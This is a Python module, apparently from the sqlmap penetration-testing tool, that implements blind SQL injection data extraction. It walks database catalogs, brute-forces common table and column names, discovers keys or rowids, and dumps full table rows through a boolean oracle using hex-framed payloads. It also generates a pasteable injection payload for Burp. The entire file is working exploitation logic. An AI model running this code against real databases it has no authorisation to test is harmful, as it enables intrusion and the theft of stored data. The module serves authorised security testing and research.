#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from .atlas import *
from .records import *
from .wordlist import commonColumns
from .wordlist import commonTables

_BRUTE_MAX_TRIES = 500      # cap existence-probes so a slow oracle can't run away
# pseudo-columns that COUNT() accepts but that aren't real columns (would poison a dump)
_PSEUDO_COLUMNS = frozenset(("rowid", "_rowid_", "oid", "ctid", "rownum", "xmin", "xmax"))


class _Enumeration(object):
    """_Enumeration

    catalog walking + data dump: enumerate / columns / dump / bulk + row selection.
    When the catalog is unreadable/unknown (permission wall, exotic engine, CTF), the
    table/column listings fall back to brute-forcing common names (bruteTables /
    bruteColumns) so extraction works with zero schema knowledge."""

    def enumerate(self, kind="table", limit=10, schema=None):
        """Bounded enumeration by keyset (MIN(name) WHERE name>'prev') - no dialect
        row limiter needed, and cost scales with `limit`, not catalog size. `schema`
        scopes tables to one database. Falls back to brute-forcing common table names
        when the catalog is unavailable/empty. For a full dump prefer enumerateBulk."""
        names = None
        if kind in self.dialect.catalogEnum and self._canPage:
            names = self.enumerateKeyset(kind, limit, schema)
        if not names and kind == "table":
            names = self.bruteTables(limit, schema)     # no catalog/paging -> guess the usual names
        return names

    @property
    def _canPage(self):
        # keyset enumeration needs an ordered comparator or IN() (NOT IN paging); with
        # neither, the catalog walk can't advance past the first row -> use brute-force
        return self._comparator in ("gt", "between") or self._inOk

    def bruteTables(self, limit=50, schema=None):
        """No/unreadable catalog: discover tables by existence-probing common names
        (COUNT(*) succeeds -> exists; errors -> the oracle reads False). The 'know
        nothing about the schema' fallback, akin to sqlmap's --common-tables."""
        self.dialect.notes.append("catalog unavailable - brute-forcing common table names")
        found, tries = [], 0
        for name in commonTables():
            if len(found) >= limit or tries >= _BRUTE_MAX_TRIES:
                break
            tries += 1
            qname = self.quoteIdent(name)
            if schema is not None:
                qname = "%s.%s" % (self.quoteIdent(schema), qname)
            try:
                if self._exists(qname):
                    found.append(name)
                    self._emit(name)
            except OracleUndecided:
                break                                   # oracle wall - stop, keep what we have
        return found

    def bruteColumns(self, table, schema=None, limit=100):
        """No/unreadable column catalog: discover columns of `table` by existence-
        probing common names (COUNT(col) succeeds -> the column exists)."""
        qtable = self.quoteIdent(table)
        if schema is not None:
            qtable = "%s.%s" % (self.quoteIdent(schema), qtable)
        found, tries = [], 0
        for col in commonColumns():
            if len(found) >= limit or tries >= _BRUTE_MAX_TRIES:
                break
            if col.lower() in _PSEUDO_COLUMNS:      # rowid/ctid/oid... are queryable but not real columns
                continue
            tries += 1
            try:
                # probe the column BARE (not quoted): a nonexistent bare column errors,
                # whereas a double-quoted unknown is silently taken as a STRING LITERAL
                # on SQLite -> would pass every fake name. COUNT-free (WAF may filter it).
                if self._exists(qtable, col):
                    found.append(col)
                    self._emit(col)
            except OracleUndecided:
                break
        if found:
            self.dialect.notes.append("column catalog unavailable - brute-forced %d common column names" % len(found))
        return found

    def _source(self, kind, schema=None):
        col, src, filt = self.dialect.catalogEnum[kind]
        clauses = [filt] if filt else []
        if schema is not None and "schema" in self.dialect.catalogEnum:
            scol = self.dialect.catalogEnum["schema"][0]        # table_schema / OWNER / schemaname
            clauses.append("%s=%s" % (scol, self.buildLiteral(schema)))
        return col, src, ((" WHERE " + " AND ".join(clauses)) if clauses else "")

    def enumerateKeyset(self, kind, limit=10, schema=None):
        if kind not in self.dialect.catalogEnum:
            return None
        col, src, where = self._source(kind, schema)
        return self._keysetWalk(col, src, where, limit)

    def _keysetWalk(self, col, src, where, limit):
        # page by keyset: MIN(name) then MIN(name) WHERE name > prev. no dialect row
        # limiter needed. the FIRST query is unbounded (a space/'' seed would skip
        # identifiers sorting below it). the DB does the ordering in its own
        # collation; Python only tests EXACT repetition (collation-invariant) - never
        # a Python `<=` ordering test.
        conj = " AND " if where else " WHERE "
        names, prev = [], None
        while len(names) < limit:
            if prev is None:
                expr = "(SELECT MIN(%s) FROM %s%s)" % (col, src, where)
            else:
                beyond = self._beyondSql(col, prev, "text", seen=names)
                if beyond is None:                   # no ordered comparator, no IN -> can't page
                    self.dialect.notes.append("enumeration stopped: no way to page (no ordered comparator, no IN)")
                    break
                expr = "(SELECT MIN(%s) FROM %s%s%s%s)" % (col, src, where, conj, beyond)
            # a best-effort walk must DEGRADE, not crash: an undecided/over-budget
            # probe (permission or charset wall) stops the listing with what we have
            try:
                if not self._ask("%s IS NOT NULL" % expr):
                    break
                name = self.extract(expr)
            except OracleUndecided:
                self.dialect.notes.append("enumeration stopped early (oracle undecided - permission/charset wall)")
                break
            if not name or name == prev:
                break
            names.append(name)
            self._emit(name)                         # live feedback per discovered name
            if _REPL in name:
                # an unrecoverable char in the name can't form a reliable keyset bound;
                # stop rather than loop on a corrupt (or repeating) boundary
                self.dialect.notes.append("enumeration stopped: %r holds an unrecoverable character" % name)
                break
            prev = name
        return names

    def _beyondSql(self, expr, prev, unit, seen=None, boundfn=None):
        # SQL fragment picking the next un-taken row for keyset paging, honoring the
        # discovered comparator so paging survives a blocked '>'. '>' pages by "sorts
        # after prev"; a blocked '>' keeps numeric keys ordered via BETWEEN, and pages
        # text keys order-free by "key NOT IN (already-seen)" (needs only IN, and dodges
        # any collation/sentinel guesswork). Returns None when none of these is possible
        # - the caller then stops with the rows it already has.
        lit = boundfn or self.buildLiteral        # rowids may need a quoted literal (see _ROWID_LITBOUND)
        if self._comparator == "gt":
            bound = prev if unit == "int" else lit(prev)
            return "%s>%s" % (expr, bound)
        if self._comparator == "between" and unit == "int":
            return "%s BETWEEN %s+1 AND 9223372036854775807" % (expr, prev)
        if self._inOk and seen:
            lits = ",".join((str(k) if unit == "int" else lit(k)) for k in seen)
            return "%s NOT IN (%s)" % (expr, lits)
        return None

    def hasTable(self, table, schema=None):
        """Does `table` (optionally in `schema`) resolve? COUNT-free existence."""
        q = self.quoteIdent(table)
        if schema:
            q = "%s.%s" % (self.quoteIdent(schema), q)
        try:
            return self._exists(q)
        except OracleUndecided:
            return False

    def tableSchema(self, table):
        """Resolve which schema a table actually lives in, from the catalog. PG-family
        tables are commonly in 'public' while current_schema() is the login user's own
        (empty) schema, so scoping to the current schema misses them. Returns the schema
        name, or None if the catalog has no schema concept or the table isn't found."""
        ce = self.dialect.catalogEnum
        if "schema" not in ce or "table" not in ce:
            return None
        schemacol = ce["schema"][0]
        namecol, source = ce["table"][0], ce["table"][1]
        # prefer a non-system schema (a system table could share the name)
        excl = ("pg_catalog", "information_schema", "sys", "mysql", "performance_schema",
                "SYS", "INFORMATION_SCHEMA", "pg_toast")
        notsys = " AND %s NOT IN (%s)" % (schemacol, ",".join(self.buildLiteral(s) for s in excl))
        for tail in (notsys, ""):
            expr = "(SELECT MIN(%s) FROM %s WHERE %s=%s%s)" % (schemacol, source, namecol, self.buildLiteral(table), tail)
            try:
                if self._ask("%s IS NOT NULL" % expr):
                    return self.extract(expr)
            except OracleUndecided:
                break
        return None

    def quoteIdent(self, name):
        """Quote a target-supplied identifier (table/column) so reserved words,
        spaces, dots, or embedded quote chars are referenced safely. A name is an
        IDENTIFIER, never a raw SQL fragment. Falls back to the bare name if no
        quoting style was discovered."""
        q = self.dialect.identQuote
        if not q:
            return name
        return "%s%s%s" % (q[0], name.replace(q[1], q[1] * 2), q[1])

    def _ensureQuoting(self, table):
        # discover the identifier-quote style using the (known-present) table:
        # the wrong quote char makes SELECT ... FROM <quoted> error -> reject
        if self.dialect.identQuote is not None or self.dialect.identQuote is False:
            return self.dialect.identQuote or None
        with self._probePhase():            # a wrong quote char makes FROM <quoted> error -> "unusable", not undecided
            for open_q, close_q in _IDENT_QUOTE:
                quoted = "%s%s%s" % (open_q, table.replace(close_q, close_q * 2), close_q)
                if self._exists(quoted):
                    self.dialect.identQuote = (open_q, close_q)
                    return self.dialect.identQuote
            self.dialect.identQuote = False             # sentinel: probed, none worked
        return None

    def columns(self, table, schema=None, limit=50):
        """Enumerate a table's column names (keyset), optionally scoped to `schema`
        (so identically-named tables in different schemas don't merge columns). Falls
        back to brute-forcing common column names when no column catalog is usable."""
        names = None
        spec = _COLUMN_SPECS.get(self.dialect.catalog)
        if spec and self._canPage:
            col, source, wheretmpl = spec[0], spec[1], spec[2]
            ordcol = spec[3] if len(spec) > 3 else None     # catalog's ordinal-position column
            schemacol = spec[4] if len(spec) > 4 else None  # the column source's OWN schema column
            lit = self.buildLiteral(table)
            filt = (wheretmpl % lit) if wheretmpl else ""
            if schema is not None and schemacol:            # explicit (e.g. Oracle OWNER, not table_schema)
                filt += " AND %s=%s" % (schemacol, self.buildLiteral(schema))
            elif schema is not None and "table_name" in (wheretmpl or ""):   # ANSI-shaped filter
                filt += " AND table_schema=%s" % self.buildLiteral(schema)
            elif schema is not None and "TABLE_NAME" in (wheretmpl or ""):
                filt += " AND TABLE_SCHEMA=%s" % self.buildLiteral(schema)
            where = (" WHERE %s" % filt) if filt else ""
            # pragma_table_info(%s) takes the table in the source itself
            source = source % lit if "%s" in source else source
            names = self._keysetWalk(col, source, where, limit)
            if names and ordcol:
                names = self._orderByOrdinal(names, col, source, filt, ordcol)
        if not names:
            names = self.bruteColumns(table, schema, limit)  # no catalog -> guess the usual names
        return names

    def _orderByOrdinal(self, names, namecol, source, filt, ordcol):
        # reorder the enumerated columns by their catalog ordinal so a dump matches the
        # table's DEFINITION order, not the alphabetical MIN()-keyset order (+1 read per
        # column). Degrades gracefully: a missing/wrong ordinal sorts last, never crashes.
        keyed = []
        for n in names:
            cond = "%s=%s" % (namecol, self.buildLiteral(n))
            if filt:
                cond = "%s AND %s" % (filt, cond)
            try:
                o = self.extractInteger("(SELECT MIN(%s) FROM %s WHERE %s)" % (ordcol, source, cond))
            except (OracleUndecided, OverflowError):
                o = None
            keyed.append((o if o is not None else 1 << 30, n))
        return [n for _, n in sorted(keyed, key=lambda t: (t[0], t[1]))]

    def _discoverKey(self, table, schema=None):
        # a primary/unique key column, preferred over a physical rowid. keyset needs
        # MIN() over it and a `> prev` bound, both of which a key column supports.
        spec = _KEY_SPECS.get(self.dialect.catalog)
        if not spec:
            return None
        source, tcol, ncol, extra = spec
        filt = "%s=%s" % (tcol, self.buildLiteral(table))
        if schema is not None:
            filt += " AND table_schema=%s" % self.buildLiteral(schema)
        if extra:
            filt += " AND %s" % extra
        # take the alphabetically-first key column (deterministic); a compound key
        # still yields a usable ordering column for the walk
        keyexpr = "(SELECT MIN(%s) FROM %s WHERE %s)" % (ncol, source, filt)
        with self._probePhase():        # a catalog that lacks this key structure errors -> "no key", not fatal
            present = self._ask("%s IS NOT NULL" % keyexpr)
        if present:
            name = self.extract(keyexpr)
            if name:
                return name
        return None

    def columnType(self, expr):
        """Coarse type hint: 'numeric' vs 'text'. RELIABLE ONLY ON STRICTLY-TYPED
        engines (PostgreSQL/Oracle/SQL Server/DB2), where SUM() over a text column
        errors. Dynamically-typed engines (SQLite, MySQL non-strict) coerce text->0
        so SUM succeeds - there the hint is unreliable and returns 'unknown' when it
        can't tell. Not a substitute for reading the catalog's declared type."""
        sums = self._ask("(SELECT SUM(%s) FROM (SELECT %s) t) IS NOT NULL" % (expr, expr))
        if not sums:
            return "text"                       # SUM errored -> definitely not numeric
        # SUM worked: real numeric, OR a coercing dynamic engine. disambiguate with a
        # cheap non-digit check on the first char (via the discovered substring)
        try:
            one = self._sub(self._resolveText(expr), 1, 1)
            if self._ask("%s>='0' AND %s<='9'" % (one, one)) or self._ask("%s='-'" % one):
                return "numeric"
        except Exception:
            pass
        return "unknown"

    def _classifyUnit(self, keyexpr, qtable):
        # a key/rowid reads as int (fast extractInteger + numeric bound) or opaque
        # text (extract + literal bound)
        q = "(SELECT MIN(%s) FROM %s)" % (keyexpr, qtable)
        if self._comparator == "between":
            # numeric range holds only for a number (text sorts outside it in SQL)
            if self._ask("%s BETWEEN -9223372036854775808 AND 9223372036854775807" % q):
                return "int"
        elif self._comparator == "gt":
            if self._ask("%s>=0" % q) or self._ask("%s<0" % q):
                return "int"
        return "text"          # membership/undecided: safe to treat as literal-bound text

    def _discoverRowid(self, qtable):
        # find a MIN-aggregatable physical row identifier for the (already-quoted)
        # table; classify int vs opaque text (SQLite rowid is int; Oracle ROWID text).
        # each candidate is a PROBE: a pseudo-column the engine lacks (ROWID on MSSQL,
        # ctid off-PG, ...) errors, which must skip to the next candidate, not fail the dump
        with self._probePhase():
            for name, tmpl, _unit in _ROWID:
                rid = tmpl % qtable if "%s" in tmpl else tmpl
                if not self._ask("(SELECT MIN(%s) FROM %s) IS NOT NULL" % (rid, qtable)):
                    continue
                unit = self._classifyUnit(rid, qtable)
                # a physical row-id used as a keyset must be a sane NON-NEGATIVE int;
                # Informix's `rowid` reads as a bogus negative here -> reject it and fall
                # through to the value-keyset walk rather than feed extractInteger garbage
                if unit == "int" and self._comparator == "gt" and \
                   not self._ask("(SELECT MIN(%s) FROM %s)>=0" % (rid, qtable)):
                    continue
                return Cap(name, rid, unit=unit)
        return None

    def _walkKey(self, qtable, table, schema):
        # ordering key, best-first: primary/unique key -> physical row-id -> value.
        # returns (key_expr, unit, source_label, boundfn); boundfn formats a keyset
        # comparison bound (quoted literal for opaque-typed row-ids, else buildLiteral).
        key = self._discoverKey(table, schema)
        if key:
            kexpr = self.quoteIdent(key)
            return kexpr, self._classifyUnit(kexpr, qtable), "key:%s" % key, self.buildLiteral
        rid = self._discoverRowid(qtable)
        if rid is not None:
            boundfn = self._lit if rid.name in _ROWID_LITBOUND else self.buildLiteral
            return rid.template, rid.get("unit"), "rowid:%s" % rid.name, boundfn
        return None, None, "value", self.buildLiteral

    def _rowPayload(self, cols):
        # one hex-framed, NULL-PRESERVING token per column, joined by ','. token
        # grammar: 'N' = SQL NULL, 'V'+hex = non-NULL value ('V' alone = empty
        # string). the marker is required because COALESCE(col,'') collapses NULL and
        # empty - and on Oracle the '' fallback is itself NULL. needs hex framing.
        if not self._ensureHexfn() or not self.dialect.concat:
            return None, False              # can't frame a whole row -> caller scavenges cell-by-cell
        parts = []
        for c in cols:
            qc = self.quoteIdent(c)             # column names are identifiers, not raw SQL
            # text-cast before hex so a numeric/date column yields its TEXT form, not
            # DBMS-internal storage bytes (SQL Server CAST(1 AS VARBINARY)=00000001)
            text = self.dialect.textcast[1].format(expr=qc) if self.dialect.textcast else qc
            marked = self.dialect.concat[1].format(a="'V'", b=self.dialect.hexfn[1].format(expr=text))
            parts.append("CASE WHEN (%s) IS NULL THEN 'N' ELSE %s END" % (qc, marked))
        interleaved = [parts[0]]
        for p in parts[1:]:
            interleaved.append("','")                # the ',' row-token delimiter
            interleaved.append(p)
        return self._concatMany(interleaved), True    # flat when concat is variadic

    def _cellRow(self, qtable, cols, where):
        # SCAVENGER row read: pull each column on its own. A single value needs no comma/
        # marker framing (so no concat) and its NULL is detected directly (so no hex 'N'
        # sentinel) - this is how a dump still works on a back-end that can neither
        # concatenate nor hex-encode. Slower (one extraction per cell), but it retrieves.
        row = []
        for c in cols:
            res = self.extractResult("(SELECT %s FROM %s WHERE %s)" % (self.quoteIdent(c), qtable, where))
            if not res.complete:
                return None, False
            row.append(res.value)
        return row, True

    def _splitRow(self, data, ncols):
        # returns (row, valid); a malformed token count/marker means invalid, never
        # a silently padded/truncated plausible row
        if data is None:
            return None, False
        toks = data.split(",")
        if len(toks) != ncols:
            return None, False
        enc = self.dialect.hexfn.get("encoding") if self.dialect.hexfn else None
        vals = []
        for t in toks:
            if t == "N":
                vals.append(None)
            elif t == "V":
                vals.append("")
            elif t.startswith("V"):
                v = self._decodeHexToken(t[1:], enc)
                if v is None:
                    return None, False
                vals.append(v)
            else:
                return None, False
        return vals, True

    def dump(self, table, columns=None, schema=None, limit=10):
        """Extract actual ROW DATA. Table/column names are treated as quoted
        IDENTIFIERS (never raw SQL). Optionally scoped to `schema`. Rows are walked
        by a primary/unique KEY when discoverable, else a physical row-id, else the
        row's own value (distinct-only); each row is one hex-framed, NULL-preserving,
        text-cast extraction. Completeness is checked against COUNT(*). Returns
        {columns, rows, complete, keyed_by}."""
        self._ensureQuoting(table)
        qtable = self.quoteIdent(table)
        if schema is not None:
            qtable = "%s.%s" % (self.quoteIdent(schema), qtable)
        cols = columns or self.columns(table, schema)
        if not cols:
            return None
        payload, framed = self._rowPayload(cols)
        if not framed:                               # no hex/concat to frame a whole row
            self.dialect.notes.append("dump %s: no hex/concat framing - scavenging cell-by-cell" % table)
        try:
            expected = self.extractInteger("(SELECT COUNT(*) FROM %s)" % qtable)
        except OracleUndecided:
            expected = None
        if expected == 0:
            return {"columns": cols, "rows": [], "complete": True, "keyed_by": None}
        keyexpr, unit, keyed_by, boundfn = self._walkKey(qtable, table, schema)
        rows, ok = [], True

        def readrow(where):
            # a whole row: one framed extraction when hex+concat exist, else cell-by-cell.
            # if the framed whole-row read doesn't verify (some engines choke on the big
            # nested CONCAT or its verification, e.g. SQL Server), degrade to reading each
            # cell on its own rather than dropping the row
            if framed:
                try:
                    res = self.extractResult("(SELECT %s FROM %s WHERE %s)" % (payload, qtable, where), codes=_HEX_PAYLOAD_CODES)
                    if res.complete:
                        return self._splitRow(res.value, len(cols))
                except OracleUndecided:
                    pass                        # framed whole-row read errored (big nested CONCAT) -> cell-by-cell
            return self._cellRow(qtable, cols, where)

        # a best-effort walk must DEGRADE, not crash: an undecided/over-budget probe
        # (permission or charset wall) stops with whatever rows were recovered
        try:
            if keyexpr is not None:                  # key / row-id keyset (preferred)
                prev, keys = None, []
                while len(rows) < limit:
                    if prev is None:
                        where = ""
                    else:
                        beyond = self._beyondSql(keyexpr, prev, unit, seen=keys, boundfn=boundfn)
                        if beyond is None:           # no ordered comparator, no IN -> can't page
                            break
                        where = " WHERE %s" % beyond
                    ke = "(SELECT MIN(%s) FROM %s%s)" % (keyexpr, qtable, where)
                    key = self.extractInteger(ke) if unit == "int" else self.extract(ke)
                    if key is None or key == "" or key == prev:
                        break
                    bound = key if unit == "int" else boundfn(key)
                    row, valid = readrow("%s=%s" % (keyexpr, bound))
                    if not valid:                    # a truncated/invalid cell != complete row
                        ok = False
                        break
                    rows.append(row)
                    self._emit(", ".join("NULL" if c is None else c for c in row))
                    prev = key
                    keys.append(key)                 # for order-free NOT IN() paging
            else:                                    # value keyset (distinct rows only)
                ok = False                           # exact-duplicate rows collapse
                self.dialect.notes.append("dump %s: no key/row-id, value-keyset walk (duplicate rows collapse)" % table)
                pageexpr = payload if framed else self.quoteIdent(cols[0])
                # the framed page-key is text; a bare first-column page-key may be numeric,
                # and a numeric column MUST be read via extractInteger + a numeric bound - a
                # text SUBSTR read mangles e.g. Derby's space-padded INT->CHAR into a garbage
                # bound ("id='   '") that matches no row (dump silently returns 0 entries)
                pageunit = "text" if framed else self._classifyUnit(pageexpr, qtable)
                prev, seen = None, []
                while len(rows) < limit:
                    if prev is None:
                        where = ""
                    else:
                        beyond = self._beyondSql(pageexpr, prev, pageunit, seen=seen)
                        if beyond is None:           # no ordered comparator, no IN -> can't page
                            break
                        where = " WHERE %s" % beyond
                    if framed:
                        res = self.extractResult("(SELECT MIN(%s) FROM %s%s)" % (pageexpr, qtable, where), codes=_HEX_PAYLOAD_CODES)
                        pv, valid = res.value, res.complete
                        row, ok2 = self._splitRow(pv, len(cols)) if pv is not None else (None, False)
                        valid = valid and ok2
                    elif pageunit == "int":          # numeric first column: read + bound as a number
                        pv = self.extractInteger("(SELECT MIN(%s) FROM %s%s)" % (pageexpr, qtable, where))
                        row, valid = self._cellRow(qtable, cols, "%s=%s" % (pageexpr, pv)) if pv is not None else (None, False)
                    else:                            # page on the first (text) column, read cells under it
                        pv = self.extract("(SELECT MIN(%s) FROM %s%s)" % (pageexpr, qtable, where))
                        row, valid = self._cellRow(qtable, cols, "%s=%s" % (pageexpr, self.buildLiteral(pv))) if pv else (None, False)
                    if pv is None or pv == "" or pv == prev or not valid:
                        break
                    rows.append(row)
                    self._emit(", ".join("NULL" if c is None else c for c in row))
                    if isinstance(pv, str) and _REPL in pv:   # a corrupt (unrecoverable) text bound can't page reliably; an int bound never carries _REPL
                        break
                    prev = pv
                    seen.append(pv)                  # for order-free NOT IN() paging
        except (OracleUndecided, OverflowError):
            # degrade, never crash: an undecided oracle (permission/charset wall) or a
            # bogus key that overflows extractInteger stops the walk with partial rows
            self.dialect.notes.append("dump %s stopped early (oracle undecided / bad key)" % table)
            ok = False
        # complete only if every row extracted cleanly AND we got them all
        complete = ok and expected is not None and len(rows) == expected
        return {"columns": cols, "rows": rows, "complete": complete, "keyed_by": keyed_by}

    def poc(self, expr, position=1, gt=64):
        """Emit a clean, pasteable boolean payload for ONE probe (the exploitation
        primitive), so a tester can drop it into Burp without re-running discovery."""
        one = self._sub(expr, position, 1)
        if self.dialect.compare == "code" and self.dialect.charcode:
            return "%s>%d" % (self.dialect.charcode[1].format(expr=one), gt)
        if self.dialect.compare == "hex" and self.dialect.hexfn:
            return "%s>'%02X'" % (self.dialect.hexfn[1].format(expr=one), gt)
        if self.dialect.compare == "collation" and self.dialect.binwrap:
            w = self.dialect.binwrap[1]
            return "%s>%s" % (w.format(x=one), w.format(x=self._lit(chr(gt))))
        if self.dialect.compare in ("equality", "equality-ci"):
            # equality mode was chosen BECAUSE ordering isn't trustworthy - don't
            # fabricate a `>` predicate the target's collation may not honour
            raise RuntimeError("ordered PoC unavailable in equality-only compare mode")
        return "%s>%s" % (one, self._lit(chr(gt)))

    def strategy(self):
        """Freeze the discovered dialect into an immutable InferenceStrategy - the
        hand-off artifact for a host inference engine (see hostExtract). Ensures the
        hex fn and quoting/backslash flags are resolved before freezing."""
        d = self.dialect
        if not self._discovered:
            self.discover()
        self._ensureHexfn()
        self._lit("x")                               # resolve backslash-escape flag
        return InferenceStrategy(
            product=d.product or d.family, family=d.family, compare_mode=d.compare,
            catalog=d.catalog, dual=(d.dual[1] if d.dual else ""), notes=tuple(d.notes),
            substring=(d.substring[1] if d.substring else None),
            index_base=(d.substring.get("index_base", 1) if d.substring else 1),
            length=(d.length[1] if d.length else None),
            charcode=(d.charcode[1] if d.charcode else None),
            charcode_sem=(d.charcode.get("semantics") if d.charcode else None),
            hexfn=(d.hexfn[1] if d.hexfn else None),
            binwrap=(d.binwrap[1] if d.binwrap else None),
            charfrom=(d.charfrom[1] if d.charfrom else None),
            concat=(d.concat[1] if d.concat else None),
            identquote=(d.identQuote if d.identQuote and d.identQuote is not False else None),
            backslash=bool(self._backslashEscape))

    def enumerateBulk(self, kind, maxchars=4096, encoding=None):
        """One-shot full dump: aggregate the whole column into one delimited string
        and extract it once. When a hex function exists each value is HEX-encoded
        before aggregation, so the ',' delimiter is unambiguous (a comma can't occur
        in a hex token) and any charset survives; otherwise raw values are joined
        (comma-ambiguous, noted). Completeness is checked against an independent
        COUNT(DISTINCT). Returns a BulkResult (list-like)."""
        if kind not in self.dialect.catalogEnum:
            return None
        col, src, where = self._source(kind)
        # independent COUNT FIRST - so a single empty-string row isn't mistaken for
        # an empty catalog (the aggregate of one '' can look like no rows)
        expected = self.extractInteger("(SELECT COUNT(DISTINCT %s) FROM %s%s)" % (col, src, where))
        if expected == 0:
            return BulkResult([], expected=0, complete=True)
        if not self._ensureHexfn():                        # delimiter safety needs hex
            self.dialect.notes.append("bulk %s: no hex framing - use enumerateKeyset" % kind)
            return None
        # 'V'-prefix each non-NULL token so an empty string is 'V' (distinct from a
        # NULL aggregate over zero rows)
        aggcol = self.dialect.concat[1].format(a="'V'", b=self.dialect.hexfn[1].format(expr=col))
        if self.dialect.bulkAgg is None:
            self.dialect.bulkAgg = self._discoverBulkAgg(aggcol, src, where)
        if not self.dialect.bulkAgg:
            return None
        agg = self.dialect.bulkAgg[1].format(col=aggcol)
        res = self.extractResult("(SELECT %s FROM %s%s)" % (agg, src, where), limit=maxchars, _ceiling=maxchars)
        joined = res.value
        if joined is None:
            return BulkResult([], expected=expected, complete=False)
        tokens = joined.split(",")
        if res.truncated and tokens:                       # last token may be partial
            tokens = tokens[:-1]
        names, seen = [], set()
        for t in tokens:
            if not t.startswith("V"):
                continue
            v = self._decodeHexToken(t[1:], encoding)
            if v is not None and v not in seen:            # dedupe (non-unique columns repeat)
                seen.add(v)
                names.append(v)
        complete = (not res.truncated) and expected is not None and len(names) == expected
        if expected is not None and len(names) != expected:
            self.dialect.notes.append("bulk %s: got %d of %d (incomplete)" % (kind, len(names), expected))
        return BulkResult(names, expected=expected, complete=complete)

    def _discoverBulkAgg(self, col, src, where):
        for name, tmpl in _BULK_AGG:
            agg = tmpl.format(col=col)
            if self._ask("(SELECT %s FROM %s%s) IS NOT NULL" % (agg, src, where)):
                return Cap(name, tmpl)
        return None
